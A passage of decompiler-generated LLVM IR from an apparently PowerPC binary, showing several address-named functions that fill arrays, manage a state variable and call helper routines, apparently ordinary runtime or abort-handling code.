  store i32 %v0_1000a3fc, i32* %v2_1000a3fc, align 4
  ret i32 1

dec_label_pc_1000a404:                            ; preds = %dec_label_pc_1000a3b8, %dec_label_pc_1000a3d4, %dec_label_pc_1000a364, %dec_label_pc_1000a384, %dec_label_pc_1000a34c
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_1000a3e4, { 1, 0 }
  uselistorder i32 %v1_1000a3e0, { 1, 0 }
  uselistorder i32 %v0_1000a3cc, { 0, 1, 3, 2 }
  uselistorder i32 5, { 13, 2, 14, 15, 25, 0, 26, 27, 1, 28, 16, 17, 18, 19, 4, 29, 3, 30, 20, 31, 5, 7, 32, 21, 33, 6, 22, 34, 8, 23, 35, 10, 36, 9, 24, 37, 12, 38, 11, 39, 40, 41, 42, 43, 44 }
  uselistorder i8 0, { 4, 11, 12, 7, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24, 25, 26, 28, 30, 27, 1, 29, 2, 31, 32, 5, 8, 33, 34, 35, 36, 37, 38, 39, 40, 3, 41, 42, 43, 44, 45, 46, 47, 49, 50, 51, 52, 48, 55, 63, 64, 56, 57, 58, 59, 53, 54, 10, 60, 61, 62, 9, 6, 65, 66, 67, 68, 69, 70, 71 }
  uselistorder i32 8, { 96, 53, 37, 38, 54, 55, 56, 57, 58, 59, 159, 162, 11, 157, 158, 12, 106, 105, 103, 104, 85, 86, 87, 107, 108, 109, 97, 98, 99, 3, 43, 44, 45, 4, 163, 5, 6, 160, 161, 60, 61, 62, 63, 110, 111, 27, 28, 39, 29, 30, 40, 31, 32, 41, 42, 7, 8, 9, 50, 51, 52, 16, 46, 47, 48, 49, 64, 65, 66, 67, 68, 69, 70, 71, 33, 72, 73, 74, 75, 76, 77, 78, 79, 80, 13, 81, 82, 83, 84, 14, 17, 88, 18, 89, 19, 90, 20, 91, 21, 92, 22, 93, 23, 94, 24, 95, 0, 1, 10, 100, 101, 34, 102, 2, 112, 113, 114, 115, 35, 116, 117, 118, 119, 120, 121, 36, 122, 123, 124, 125, 126, 127, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 128, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 25, 152, 15, 153, 154, 155, 156, 26 }
  uselistorder i32 -48, { 1, 0, 2 }
  uselistorder i32 10, { 66, 38, 14, 37, 2, 3, 5, 4, 0, 15, 16, 17, 29, 18, 19, 30, 20, 21, 31, 7, 6, 32, 33, 36, 34, 8, 9, 35, 1, 22, 23, 24, 25, 10, 39, 40, 41, 42, 43, 44, 45, 11, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 26, 67, 68, 69, 70, 27, 71, 28, 12, 72, 13, 73 }
  uselistorder i16 0, { 0, 1, 2, 4, 5, 6, 7, 8, 3, 9 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1000a404, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_1000a364, { 1, 0 }
}

define i32 @function_1000a40c(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000a40c:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_1000a410 = load i32, i32* @lr, align 4
  store i32 %v0_1000a410, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_1000a41c = icmp eq i32* %arg2, null
  store i32 %arg3, i32* @r30, align 4
  store i32 %arg1, i32* @r29, align 4
  %v1_1000a42c = add i32 %tmp, 4
  store i32 %v1_1000a42c, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  %v2_1000a434 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %v2_1000a434, i32* @r3, align 4
  br i1 %v3_1000a41c, label %dec_label_pc_1000a45c, label %dec_label_pc_1000a43c

dec_label_pc_1000a43c:                            ; preds = %dec_label_pc_1000a40c
  %v2_1000a43c = load i32, i32* %arg2, align 4
  store i32 %v2_1000a43c, i32* %r0.global-to-local, align 4
  store i32 268477512, i32* @lr, align 4
  %v0_1000a444 = call i32 @function_100084c8()
  %v0_1000a448 = load i32, i32* @r31, align 4
  %v1_1000a448 = add i32 %v0_1000a448, 132
  %v2_1000a448 = inttoptr i32 %v1_1000a448 to i32*
  %v3_1000a448 = load i32, i32* %v2_1000a448, align 4
  store i32 %v3_1000a448, i32* %r0.global-to-local, align 4
  %v1_1000a454 = add i32 %v0_1000a448, 136
  %v2_1000a454 = inttoptr i32 %v1_1000a454 to i32*
  %v3_1000a454 = load i32, i32* %v2_1000a454, align 4
  store i32 %v3_1000a454, i32* %r0.global-to-local, align 4
  %v0_1000a45c.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000a45c

dec_label_pc_1000a45c:                            ; preds = %dec_label_pc_1000a40c, %dec_label_pc_1000a43c
  %v0_1000a45c = phi i32 [ %arg3, %dec_label_pc_1000a40c ], [ %v0_1000a45c.pre, %dec_label_pc_1000a43c ]
  %v3_1000a45c = icmp eq i32 %v0_1000a45c, 0
  %v2_1000a474 = ptrtoint i32* %stack_var_-172 to i32
  %.v2_1000a474 = select i1 %v3_1000a45c, i32 0, i32 %v2_1000a474
  store i32 %.v2_1000a474, i32* @r5, align 4
  store i32 268477564, i32* @lr, align 4
  %v0_1000a478 = call i32 @function_1000a670()
  %v0_1000a47c = load i32, i32* @r30, align 4
  %v3_1000a47c = icmp eq i32 %v0_1000a47c, 0
  store i32 %v0_1000a478, i32* @r31, align 4
  br i1 %v3_1000a47c, label %dec_label_pc_1000a4b8, label %dec_label_pc_1000a48c

dec_label_pc_1000a48c:                            ; preds = %dec_label_pc_1000a45c
  %v1_1000a484 = icmp slt i32 %v0_1000a478, 0
  %v1_1000a48c = add i32 %v0_1000a47c, 4
  store i32 %v1_1000a48c, i32* @r3, align 4
  %v2_1000a490 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_1000a490, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  br i1 %v1_1000a484, label %dec_label_pc_1000a4b8, label %dec_label_pc_1000a49c

dec_label_pc_1000a49c:                            ; preds = %dec_label_pc_1000a48c
  %v3_1000a49c = load i32, i32* %stack_var_-172, align 4
  store i32 %v3_1000a49c, i32* %r0.global-to-local, align 4
  %v2_1000a4a0 = inttoptr i32 %v0_1000a47c to i32*
  store i32 %v3_1000a49c, i32* %v2_1000a4a0, align 4
  store i32 268477608, i32* @lr, align 4
  %v0_1000a4a4 = call i32 @function_100084c8()
  %v1_1000a4b0 = load i32, i32* @r30, align 4
  %v2_1000a4b0 = add i32 %v1_1000a4b0, 136
  %v3_1000a4b0 = inttoptr i32 %v2_1000a4b0 to i32*
  %v0_1000a4b4 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a4b4 = load i32, i32* @r30, align 4
  %v2_1000a4b4 = add i32 %v1_1000a4b4, 132
  %v3_1000a4b4 = inttoptr i32 %v2_1000a4b4 to i32*
  store i32 %v0_1000a4b4, i32* %v3_1000a4b4, align 4
  %v0_1000a4bc.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000a4b8

dec_label_pc_1000a4b8:                            ; preds = %dec_label_pc_1000a48c, %dec_label_pc_1000a45c, %dec_label_pc_1000a49c
  %v0_1000a4bc = phi i32 [ %v0_1000a478, %dec_label_pc_1000a48c ], [ %v0_1000a478, %dec_label_pc_1000a45c ], [ %v0_1000a4bc.pre, %dec_label_pc_1000a49c ]
  store i32 %v0_1000a410, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000a4bc

; uselistorder directives
  uselistorder i32 %v0_1000a478, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 3, 4, 5, 6, 2 }
  uselistorder i32 136, { 1, 2, 0 }
  uselistorder i32 ()* @function_100084c8, { 1, 0, 8, 4, 2, 3, 7, 9, 6, 5 }
  uselistorder i32* @r5, { 25, 0, 26, 2, 14, 15, 16, 34, 20, 8, 9, 35, 36, 37, 38, 4, 29, 30, 1, 31, 32, 33, 17, 7, 27, 28, 3, 6, 5, 18, 21, 22, 23, 24, 10, 11, 12, 13, 19 }
  uselistorder i32 128, { 13, 14, 2, 7, 8, 9, 11, 10, 12, 3, 0, 1, 4, 5, 6 }
  uselistorder i32* @r30, { 183, 184, 185, 0, 186, 1, 104, 2, 32, 33, 34, 187, 190, 188, 189, 105, 106, 107, 93, 94, 95, 96, 97, 108, 109, 113, 110, 111, 112, 6, 7, 8, 9, 10, 11, 12, 3, 13, 18, 19, 20, 21, 22, 23, 24, 25, 26, 14, 15, 16, 17, 27, 28, 29, 30, 31, 35, 36, 37, 38, 39, 40, 41, 4, 42, 43, 5, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 99, 100, 98, 101, 102, 103, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 158, 155, 156, 157, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 179, 180, 178, 181, 182 }
  uselistorder i32* null, { 0, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 1, 16, 17, 18, 19, 20, 21, 22, 23, 42, 29, 30, 43, 31, 32, 33, 34, 2, 35, 36, 37, 38, 3, 39, 40, 4, 41, 5, 24, 25, 26, 27, 28 }
  uselistorder i32* @r31, { 2, 266, 267, 268, 204, 3, 205, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 275, 276, 269, 16, 270, 271, 272, 273, 274, 47, 48, 206, 207, 208, 209, 210, 211, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 212, 216, 213, 214, 215, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 67, 4, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 27, 28, 29, 30, 82, 83, 84, 85, 86, 39, 40, 0, 41, 5, 42, 31, 32, 33, 34, 35, 36, 37, 6, 38, 43, 44, 45, 46, 7, 49, 50, 51, 52, 53, 54, 55, 56, 87, 88, 89, 90, 91, 92, 93, 94, 95, 1, 8, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 9, 198, 199, 200, 201, 202, 203, 14, 217, 218, 219, 220, 10, 224, 225, 226, 227, 221, 222, 223, 228, 229, 230, 231, 232, 233, 234, 235, 15, 236, 237, 12, 238, 239, 240, 241, 242, 244, 11, 243, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 13, 259, 260, 261, 262, 263, 264, 265 }
  uselistorder label %dec_label_pc_1000a4b8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a45c, { 1, 0 }
}

define i32 @function_1000a4d0(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000a504.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v0_1000a4e8 = call i32 @function_100098c4()
  %v2_1000a4f0 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_1000a4f0, i32* %r29.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 31, i32* %r9.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v3_1000a50833 = add i32 %v2_1000a4f0, 124
  %v4_1000a50834 = inttoptr i32 %v3_1000a50833 to i32*
  store i32 0, i32* %v4_1000a50834, align 4
  %v0_1000a50c35 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a50c36 = add i32 %v0_1000a50c35, -1
  store i32 %v1_1000a50c36, i32* %r9.global-to-local, align 4
  %v0_1000a51037 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a51038 = add i32 %v0_1000a51037, -1
  store i32 %v1_1000a51038, i32* %ctr.global-to-local, align 4
  %v2_1000a51039 = icmp eq i32 %v1_1000a51038, 0
  br i1 %v2_1000a51039, label %dec_label_pc_1000a514, label %dec_label_pc_1000a504.dec_label_pc_1000a504_crit_edge

dec_label_pc_1000a504.dec_label_pc_1000a504_crit_edge: ; preds = %dec_label_pc_1000a504.lr.ph, %dec_label_pc_1000a504.dec_label_pc_1000a504_crit_edge
  %v1_1000a50c40 = phi i32 [ %v1_1000a50c, %dec_label_pc_1000a504.dec_label_pc_1000a504_crit_edge ], [ %v1_1000a50c36, %dec_label_pc_1000a504.lr.ph ]
  %v0_1000a508.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a508.pre = load i32, i32* %r29.global-to-local, align 4
  %v1_1000a504 = mul i32 %v1_1000a50c40, 4
  %v3_1000a508 = add i32 %v1_1000a504, %v1_1000a508.pre
  %v4_1000a508 = inttoptr i32 %v3_1000a508 to i32*
  store i32 %v0_1000a508.pre, i32* %v4_1000a508, align 4
  %v0_1000a50c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a50c = add i32 %v0_1000a50c, -1
  store i32 %v1_1000a50c, i32* %r9.global-to-local, align 4
  %v0_1000a510 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a510 = add i32 %v0_1000a510, -1
  store i32 %v1_1000a510, i32* %ctr.global-to-local, align 4
  %v2_1000a510 = icmp eq i32 %v1_1000a510, 0
  br i1 %v2_1000a510, label %dec_label_pc_1000a514, label %dec_label_pc_1000a504.dec_label_pc_1000a504_crit_edge

dec_label_pc_1000a514:                            ; preds = %dec_label_pc_1000a504.dec_label_pc_1000a504_crit_edge, %dec_label_pc_1000a504.lr.ph
  store i32 %v2_1000a4f0, i32* @r3, align 4
  store i32 6, i32* @r4, align 4
  %v0_1000a51c = call i32 @function_10008d18()
  %v3_1000a520 = icmp eq i32 %v0_1000a51c, 0
  br i1 %v3_1000a520, label %dec_label_pc_1000a528, label %dec_label_pc_1000a538

dec_label_pc_1000a528:                            ; preds = %dec_label_pc_1000a514
  store i32 268477752, i32* @lr, align 4
  %v3_1000a534 = call i32 @function_100080c0(i32 1, i32 %v2_1000a4f0, i32 0)
  br label %dec_label_pc_1000a538

dec_label_pc_1000a538:                            ; preds = %dec_label_pc_1000a514, %dec_label_pc_1000a528
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_1000a53c = load i32, i32* @global_var_1001b2c8.403, align 4
  %v3_1000a540 = icmp eq i32 %v3_1000a53c, 0
  br i1 %v3_1000a540, label %dec_label_pc_1000a548, label %dec_label_pc_1000a570

dec_label_pc_1000a548:                            ; preds = %dec_label_pc_1000a538
  store i32 1, i32* @global_var_1001b2c8.403, align 4
  br label %dec_label_pc_1000a550

dec_label_pc_1000a550:                            ; preds = %dec_label_pc_1000a5cc, %dec_label_pc_1000a548
  store i32 ptrtoint (i32* @global_var_1001b250.401 to i32), i32* %r29.global-to-local, align 4
  %v0_1000a55c = call i32 @function_100098c4()
  store i32 268477800, i32* @lr, align 4
  %v1_1000a564 = call i32 @function_10008b68(i32 6)
  %v0_1000a56c = call i32 @function_100098c4()
  %v3_1000a574.pre = load i32, i32* @global_var_1001b2c8.403, align 4
  br label %dec_label_pc_1000a570

dec_label_pc_1000a570:                            ; preds = %dec_label_pc_1000a538, %dec_label_pc_1000a550
  %v0_1000a5e8 = phi i32 [ %v3_1000a53c, %dec_label_pc_1000a538 ], [ %v3_1000a574.pre, %dec_label_pc_1000a550 ]
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_1000a578 = icmp eq i32 %v0_1000a5e8, 1
  br i1 %v3_1000a578, label %dec_label_pc_1000a5b8.lr.ph, label %dec_label_pc_1000a5e8

dec_label_pc_1000a5b8.lr.ph:                      ; preds = %dec_label_pc_1000a570
  %v2_1000a584 = ptrtoint i32* %stack_var_-168 to i32
  store i32 2, i32* @global_var_1001b2c8.403, align 4
  store i32 ptrtoint (i32* @global_var_1000a598.405 to i32), i32* @lr, align 4
  %v3_1000a594 = call i32 @function_10008608(i32 %v2_1000a584, i32 0, i32 140)
  store i32 %v2_1000a4f0, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  store i32 0, i32* %stack_var_-168, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 %v3_1000a50833, i32* %r9.global-to-local, align 4
  %v2_1000a5c025 = add i32 %v2_1000a4f0, 256
  %v3_1000a5c026 = inttoptr i32 %v2_1000a5c025 to i32*
  store i32 -1, i32* %v3_1000a5c026, align 4
  %v0_1000a5c427 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a5c428 = add i32 %v0_1000a5c427, -1
  store i32 %v1_1000a5c428, i32* %r11.global-to-local, align 4
  %v0_1000a5c829 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a5c830 = add i32 %v0_1000a5c829, -1
  store i32 %v1_1000a5c830, i32* %ctr.global-to-local, align 4
  %v2_1000a5c831 = icmp eq i32 %v1_1000a5c830, 0
  br i1 %v2_1000a5c831, label %dec_label_pc_1000a5cc, label %dec_label_pc_1000a5b8.dec_label_pc_1000a5b8_crit_edge

dec_label_pc_1000a5b8.dec_label_pc_1000a5b8_crit_edge: ; preds = %dec_label_pc_1000a5b8.lr.ph, %dec_label_pc_1000a5b8.dec_label_pc_1000a5b8_crit_edge
  %v1_1000a5c432 = phi i32 [ %v1_1000a5c4, %dec_label_pc_1000a5b8.dec_label_pc_1000a5b8_crit_edge ], [ %v1_1000a5c428, %dec_label_pc_1000a5b8.lr.ph ]
  %v1_1000a5bc.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_1000a5c0.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_1000a5b8 = mul i32 %v1_1000a5c432, 4
  %v2_1000a5bc = add i32 %v1_1000a5b8, %v1_1000a5bc.pre
  store i32 %v2_1000a5bc, i32* %r9.global-to-local, align 4
  %v2_1000a5c0 = add i32 %v2_1000a5bc, 132
  %v3_1000a5c0 = inttoptr i32 %v2_1000a5c0 to i32*
  store i32 %v0_1000a5c0.pre, i32* %v3_1000a5c0, align 4
  %v0_1000a5c4 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a5c4 = add i32 %v0_1000a5c4, -1
  store i32 %v1_1000a5c4, i32* %r11.global-to-local, align 4
  %v0_1000a5c8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a5c8 = add i32 %v0_1000a5c8, -1
  store i32 %v1_1000a5c8, i32* %ctr.global-to-local, align 4
  %v2_1000a5c8 = icmp eq i32 %v1_1000a5c8, 0
  br i1 %v2_1000a5c8, label %dec_label_pc_1000a5cc, label %dec_label_pc_1000a5b8.dec_label_pc_1000a5b8_crit_edge

dec_label_pc_1000a5cc:                            ; preds = %dec_label_pc_1000a5b8.dec_label_pc_1000a5b8_crit_edge, %dec_label_pc_1000a5b8.lr.ph
  store i32 268477924, i32* @lr, align 4
  %v4_1000a5e0 = call i32 @function_1000a40c(i32 6, i32* nonnull %stack_var_-168, i32 0)
  br label %dec_label_pc_1000a550

dec_label_pc_1000a5e8:                            ; preds = %dec_label_pc_1000a570
  %v3_1000a5e8 = icmp eq i32 %v0_1000a5e8, 2
  br i1 %v3_1000a5e8, label %dec_label_pc_1000a5f0, label %dec_label_pc_1000a5fc

dec_label_pc_1000a5f0:                            ; preds = %dec_label_pc_1000a5e8
  store i32 3, i32* @global_var_1001b2c8.403, align 4
  br label %dec_label_pc_1000a5fc

dec_label_pc_1000a5fc:                            ; preds = %dec_label_pc_1000a5e8, %dec_label_pc_1000a5f0
  %v3_1000a5fc = phi i32 [ %v0_1000a5e8, %dec_label_pc_1000a5e8 ], [ 3, %dec_label_pc_1000a5f0 ]
  %v1_1000a604 = icmp ne i32 %v3_1000a5fc, 3
  call void @__pseudo_cond_branch(i1 %v1_1000a604, i32 268477976)
  store i32 4, i32* @global_var_1001b2c8.403, align 4
  %v1_1000a614 = call i32 @function_10009c64(i32 127)
  ret i32 %v1_1000a614

; uselistorder directives
  uselistorder i32 %v1_1000a5c8, { 1, 0 }
  uselistorder i32 %v1_1000a5c4, { 1, 0 }
  uselistorder i32 %v1_1000a510, { 1, 0 }
  uselistorder i32 %v1_1000a50c, { 1, 0 }
  uselistorder i32 %v2_1000a4f0, { 0, 2, 3, 4, 1, 5 }
  uselistorder i32* %r9.global-to-local, { 4, 2, 5, 6, 8, 7, 3, 0, 1 }
  uselistorder i32* %r11.global-to-local, { 4, 3, 2, 0, 1, 5, 6 }
  uselistorder i32* %ctr.global-to-local, { 7, 6, 4, 0, 1, 9, 8, 5, 2, 3 }
  uselistorder i32 (i32)* @function_10009c64, { 1, 0 }
  uselistorder i32 3, { 0, 4, 21, 67, 65, 68, 69, 35, 80, 79, 6, 85, 86, 87, 70, 71, 81, 82, 83, 84, 1, 5, 22, 23, 36, 46, 24, 2, 62, 37, 38, 39, 25, 40, 41, 43, 44, 42, 45, 26, 27, 7, 47, 3, 48, 49, 9, 50, 28, 8, 51, 52, 53, 54, 10, 29, 11, 55, 56, 13, 30, 12, 57, 58, 31, 59, 14, 15, 16, 60, 61, 17, 32, 18, 63, 64, 19, 33, 20, 66, 72, 73, 74, 76, 75, 77, 34, 78 }
  uselistorder i32 (i32, i32*, i32)* @function_1000a40c, { 1, 2, 0 }
  uselistorder i32 132, { 1, 2, 3, 0 }
  uselistorder i32 256, { 54, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0, 58, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 56, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 55, 59, 60, 61, 53, 57 }
  uselistorder i32 (i32, i32, i32)* @function_10008608, { 1, 7, 10, 0, 3, 9, 8, 6, 5, 4, 2 }
  uselistorder i32 2, { 183, 39, 0, 1, 58, 59, 184, 60, 185, 61, 186, 27, 2, 3, 4, 40, 110, 123, 187, 111, 28, 62, 41, 63, 30, 29, 31, 64, 65, 107, 66, 67, 108, 109, 122, 6, 5, 69, 68, 70, 32, 167, 112, 74, 113, 73, 114, 72, 115, 71, 42, 116, 7, 8, 9, 75, 76, 77, 78, 117, 118, 119, 10, 38, 120, 121, 79, 80, 82, 81, 83, 44, 43, 84, 85, 33, 37, 124, 168, 11, 34, 169, 12, 125, 126, 127, 128, 129, 87, 130, 86, 131, 88, 89, 132, 133, 90, 91, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 13, 14, 15, 16, 17, 18, 92, 144, 45, 145, 146, 147, 148, 149, 19, 20, 21, 22, 23, 24, 93, 150, 46, 151, 152, 153, 154, 155, 156, 94, 157, 95, 158, 47, 159, 160, 161, 163, 164, 165, 162, 96, 166, 48, 170, 171, 172, 97, 98, 174, 175, 176, 173, 99, 177, 49, 35, 178, 101, 50, 179, 51, 52, 102, 53, 36, 54, 103, 55, 104, 56, 105, 57, 106, 180, 25, 26, 181, 100, 182 }
  uselistorder i32* @global_var_1001b2c8.403, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 268566528, { 22, 23, 0, 24, 2, 1, 3, 21, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 4, 17, 5, 18, 19, 20 }
  uselistorder i32 (i32, i32, i32)* @function_100080c0, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 ()* @function_10008d18, { 2, 1, 0, 4, 3 }
  uselistorder i32* @r4, { 71, 72, 73, 59, 60, 32, 1, 33, 6, 34, 81, 79, 5, 4, 74, 76, 77, 58, 75, 9, 7, 61, 10, 11, 12, 8, 80, 35, 36, 78, 13, 14, 15, 62, 24, 25, 26, 3, 52, 53, 54, 55, 16, 17, 18, 19, 20, 21, 22, 23, 27, 28, 29, 30, 31, 37, 0, 2, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 56, 57, 63, 64, 65, 66, 67, 68, 69, 70 }
  uselistorder i32 6, { 9, 10, 59, 1, 11, 12, 34, 0, 35, 13, 14, 15, 16, 17, 18, 19, 20, 21, 2, 22, 23, 24, 25, 26, 27, 36, 28, 37, 38, 39, 3, 40, 4, 41, 42, 43, 29, 5, 44, 45, 30, 6, 46, 31, 47, 48, 49, 50, 32, 7, 51, 52, 53, 54, 55, 33, 8, 56, 57, 58 }
  uselistorder i32 4, {}
  uselistorder i32 32, { 20, 21, 50, 41, 42, 32, 33, 16, 17, 39, 40, 34, 0, 1, 2, 18, 51, 19, 52, 22, 23, 35, 37, 3, 4, 5, 24, 38, 6, 7, 8, 9, 10, 25, 26, 36, 43, 44, 45, 46, 47, 48, 49, 53, 54, 55, 56, 57, 11, 12, 27, 58, 28, 59, 29, 60, 13, 14, 15, 61, 62, 30, 31 }
  uselistorder i32 31, { 1, 2, 13, 24, 25, 3, 4, 0, 5, 28, 29, 18, 19, 26, 27, 14, 15, 20, 21, 22, 23, 11, 12, 7, 8, 9, 10, 16, 17, 6 }
  uselistorder i32 ()* @function_100098c4, { 3, 2, 1, 0, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 21, 20, 19 }
  uselistorder label %dec_label_pc_1000a5fc, { 1, 0 }
  uselistorder label %dec_label_pc_1000a5b8.dec_label_pc_1000a5b8_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000a570, { 1, 0 }
  uselistorder label %dec_label_pc_1000a538, { 1, 0 }
  uselistorder label %dec_label_pc_1000a504.dec_label_pc_1000a504_crit_edge, { 1, 0 }
}

define i32 @function_1000a620(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000a620:
  %v1_1000a620 = add i32 %arg1, 28
  %v2_1000a620 = inttoptr i32 %v1_1000a620 to i32*
  %v3_1000a620 = load i32, i32* %v2_1000a620, align 4
  store i32 %v3_1000a620, i32* @global_var_1001b2cc.406, align 4
  %v1_1000a630 = add i32 %arg1, 44
  %v2_1000a630 = inttoptr i32 %v1_1000a630 to i32*
  %v3_1000a630 = load i32, i32* %v2_1000a630, align 4
  store i32 %v3_1000a630, i32* @global_var_1001b2d0.407, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 44, { 17, 5, 10, 11, 6, 7, 8, 9, 2, 12, 3, 13, 14, 15, 0, 1, 4, 16 }
  uselistorder i32 28, { 29, 8, 9, 2, 3, 10, 7, 25, 5, 6, 4, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 1, 24, 26, 27, 28 }
  uselistorder i32 %arg1, { 1, 0, 2 }
}

define i32 @function_1000a63c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000a63c:
  store i32 %arg1, i32* @global_var_1001b2d4.400, align 4
  %v0_1000a664 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 true, i32 %v0_1000a664)
  %v1_1000a66c = call i32 @function_1000a6b8(i32 12)
  ret i32 %v1_1000a66c

; uselistorder directives
  uselistorder i32 12, { 13, 41, 42, 29, 30, 43, 44, 45, 46, 87, 88, 89, 90, 6, 85, 91, 0, 1, 8, 86, 5, 14, 15, 9, 36, 47, 48, 16, 49, 50, 51, 17, 18, 31, 19, 20, 32, 21, 22, 33, 23, 24, 34, 35, 7, 37, 38, 39, 40, 25, 26, 27, 28, 80, 52, 53, 54, 55, 56, 57, 58, 59, 60, 10, 61, 62, 63, 64, 65, 66, 67, 11, 68, 69, 70, 71, 72, 73, 74, 75, 76, 12, 77, 78, 79, 81, 82, 83, 84, 2, 3, 4, 92, 93, 94 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 2, 10, 0, 3, 12, 11, 4, 5, 1, 6, 7, 8, 9 }
  uselistorder i1 true, { 1, 0 }
  uselistorder i32* @global_var_1001b2d4.400, { 1, 0, 2 }
}

define i32 @function_1000a670() local_unnamed_addr {
dec_label_pc_1000a670:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000a688 = call i32 @__asm_mfcr()
  %v1_1000a68c = and i32 %v0_1000a688, 268435456
  %v3_1000a68c = icmp eq i32 %v1_1000a68c, 0
  store i32 %v0_1000a688, i32* %r31.global-to-local, align 4
  br i1 %v3_1000a68c, label %dec_label_pc_1000a6a4, label %dec_label_pc_1000a698

dec_label_pc_1000a698:                            ; preds = %dec_label_pc_1000a670
  %v0_1000a698 = call i32 @function_10008484()
  %v0_1000a69c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000a69c = inttoptr i32 %v0_1000a698 to i32*
  store i32 %v0_1000a69c, i32* %v2_1000a69c, align 4
  br label %dec_label_pc_1000a6a4

dec_label_pc_1000a6a4:                            ; preds = %dec_label_pc_1000a670, %dec_label_pc_1000a698
